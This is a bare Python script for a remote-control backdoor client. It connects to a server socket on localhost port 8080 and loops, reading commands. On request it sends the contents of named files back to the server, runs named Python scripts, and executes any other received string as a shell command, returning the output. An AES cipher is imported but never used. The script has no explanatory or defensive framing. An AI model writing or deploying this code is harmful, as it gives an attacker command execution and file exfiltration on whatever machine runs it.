import socket
from Crypto.Cipher import AES
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 8080))

while True:
    # Receive command from server
    command_received = client.recv(1024).decode()

    # Execute received command
    if command_received.startswith('upload:'):
        filename = command_received.split(':')[1]
        with open(filename, 'rb') as f:
            file_content = f.read()
            client.send(file_content)
    elif command_received.startswith('runscript:'):
        script_name = command_received.split(':')[1]
        script_output = subprocess.getoutput(f"python {script_name}")
        client.send(script_output.encode())
    else:
        command_output = subprocess.getoutput(command_received)
        client.send(command_output.encode())